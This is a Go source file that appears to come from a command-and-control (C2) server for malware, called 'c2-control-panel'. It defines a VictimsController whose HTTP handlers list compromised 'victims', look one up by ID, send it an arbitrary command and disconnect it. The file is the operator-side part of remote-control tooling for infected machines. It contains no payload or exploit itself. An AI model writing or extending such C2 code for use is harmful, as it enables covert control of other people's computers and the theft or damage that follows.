package controllers

import (
	"c2-control-panel/api/services"

	"github.com/gofiber/fiber/v2"
)

type VictimsController struct {
	service *services.VictimsService
}

func NewVictimsController(service *services.VictimsService) *VictimsController {
	return &VictimsController{service: service}
}

func (vc *VictimsController) GetVictims(c *fiber.Ctx) error {
	return c.JSON(vc.service.GetAll())
}

func (vc *VictimsController) GetVictim(c *fiber.Ctx) error {
	victim, err := vc.service.GetByID(c.Params("id"))
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{"error": err.Error()})
	}
	return c.JSON(victim)
}

func (vc *VictimsController) SendCommand(c *fiber.Ctx) error {
	var body struct {
		Command string `json:"command"`
	}
	if err := c.BodyParser(&body); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "invalid request body"})
	}
	if err := vc.service.SendCommand(c.Params("id"), body.Command); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": err.Error()})
	}
	return c.JSON(fiber.Map{"status": "sent"})
}

func (vc *VictimsController) Disconnect(c *fiber.Ctx) error {
	if err := vc.service.Disconnect(c.Params("id")); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": err.Error()})
	}
	return c.JSON(fiber.Map{"status": "disconnected"})
}
